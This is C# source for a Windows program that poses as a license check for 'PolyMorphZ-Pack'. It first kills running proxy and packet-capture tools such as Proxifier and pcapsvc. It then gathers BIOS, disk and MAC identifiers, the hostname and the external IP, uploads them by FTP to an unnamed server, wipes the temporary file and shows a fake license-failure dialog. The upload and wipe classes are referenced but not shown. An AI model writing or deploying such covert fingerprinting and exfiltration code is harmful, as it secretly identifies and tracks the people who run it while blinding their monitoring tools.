using System;
using System.IO;
using System.Management;
using System.Security.Cryptography;
using System.Security;
using System.Collections;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Diagnostics;
using System.Windows.Forms;


namespace Entry
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            // Store all running process in the system
            Process[] runingProcess = Process.GetProcesses();
            for (int i = 0; i < runingProcess.Length; i++)
            {
                // compare equivalent process by their name
                if (runingProcess[i].ProcessName == "Proxifier" | runingProcess[i].ProcessName == "freecap" | runingProcess[i].ProcessName == "widecap" | runingProcess[i].ProcessName == "pcapui" | runingProcess[i].ProcessName == "pcapsvc")
                {
                    // kill  running process
                    runingProcess[i].Kill();
                }

            }

            FingerPrint secClass = new FingerPrint();

            string[] biosid = secClass.biosId();


            string[] diskid = secClass.diskId();


            string[] networkid = secClass.networkId();

            string result = Path.GetTempFileName();

            //Debugging code

            //Console.WriteLine(result);

            //Write information to temp file

            File.WriteAllLines(result, biosid);

            File.AppendAllLines(result, diskid);

            File.AppendAllLines(result, networkid);

            //Debugging code

            //Console.Write(result);

            //Upload temp file via Ftp

            fileUpload.uploadFile(result);

            //Temp file clean-up

            secureWipe newWipe = new secureWipe();

            newWipe.secureFileWipe(result);

            //Debugging code

            //Console.ReadKey(true);


            MessageBox.Show("PolyMorphZ-Pack is not licensed to run on this system",
                                   "License Registration Failure",
                                                  MessageBoxButtons.OK,
                                                  MessageBoxIcon.Error);

        }
    }
}


public class FingerPrint
{

    #region Original Device ID Getting Code
    //Return a hardware identifier
    private static string identifier
    (string wmiClass, string wmiProperty, string wmiMustBeTrue)
    {
        string result = "";
        System.Management.ManagementClass mc =
    new System.Management.ManagementClass(wmiClass);
        System.Management.ManagementObjectCollection moc = mc.GetInstances();
        foreach (System.Management.ManagementObject mo in moc)
        {
            if (mo[wmiMustBeTrue].ToString() == "True")
            {
                //Only get the first one
                if (result == "")
                {
                    try
                    {
                        result = mo[wmiProperty].ToString();
                        break;
                    }
                    catch
                    {
                    }
                }
            }
        }
        return result;
    }
    //Return a hardware identifier
    private static string identifier(string wmiClass, string wmiProperty)
    {
        string result = "";
        System.Management.ManagementClass mc =
    new System.Management.ManagementClass(wmiClass);
        System.Management.ManagementObjectCollection moc = mc.GetInstances();
        foreach (System.Management.ManagementObject mo in moc)
        {
            //Only get the first one
            if (result == "")
            {
                try
                {
                    result = mo[wmiProperty].ToString();
                    break;
                }
                catch
                {
                }
            }
        }
        return result;
    }
    //BIOS Identifier
    public string[] biosId()
    {

        string[] biosIdentify;
        biosIdentify = new string[7];

        biosIdentify[0] = "BIOS Information...";
        biosIdentify[1] = "Manufacturer = " + identifier("Win32_BIOS", "Manufacturer");
        biosIdentify[2] = "SMBIOSBIOSVersion = " + identifier("Win32_BIOS", "SMBIOSBIOSVersion");
        biosIdentify[3] = "IdentificationCode = " + identifier("Win32_BIOS", "IdentificationCode");
        biosIdentify[4] = "SerialNumber = " + identifier("Win32_BIOS", "SerialNumber");
        biosIdentify[5] = "ReleaseDate = " + identifier("Win32_BIOS", "ReleaseDate");
        biosIdentify[6] = "Version = " + identifier("Win32_BIOS", "Version");

        //Debugging code

        //for (int i = 0; i < biosIdentify.Length; i++)
        // {
        //     Console.WriteLine(biosIdentify[i]);
        // }  

        return biosIdentify;

    }
    //Main physical hard drive ID
    public string[] diskId()
    {

        string[] diskIdentify;
        diskIdentify = new string[5];

        diskIdentify[0] = "\r\n" + "Disk Information...";
        diskIdentify[1] = "Model = " + identifier("Win32_DiskDrive", "Model");
        diskIdentify[2] = "Manufacturer = " + identifier("Win32_DiskDrive", "Manufacturer");
        diskIdentify[3] = "Signature = " + identifier("Win32_DiskDrive", "Signature");
        diskIdentify[4] = "TotalHeads = " + identifier("Win32_DiskDrive", "TotalHeads");

        return diskIdentify;
    }

    public string[] networkId()
    {

        //Get Hostname
        string host = Dns.GetHostName();

        //Get External IP Address
        WebClient wc = new WebClient();
        wc.Proxy = null;
        string ipAddress = wc.DownloadString("http://icanhazip.com");

        //Get MAC Address
        ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration where IPEnabled=true");
        IEnumerable<ManagementObject> objects = searcher.Get().Cast<ManagementObject>();
        string mac = (from o in objects orderby o["IPConnectionMetric"] select o["MACAddress"].ToString()).FirstOrDefault();


        //Create Array
        string[] networkIdentify;
        networkIdentify = new string[4];

        networkIdentify[0] = "\r\n" + "Network information...";
        networkIdentify[1] = "Hostname = " + host;
        networkIdentify[2] = "External IP Address = " + ipAddress;
        networkIdentify[3] = "MAC Address = " + mac;

        return networkIdentify;

    }

    #endregion
}
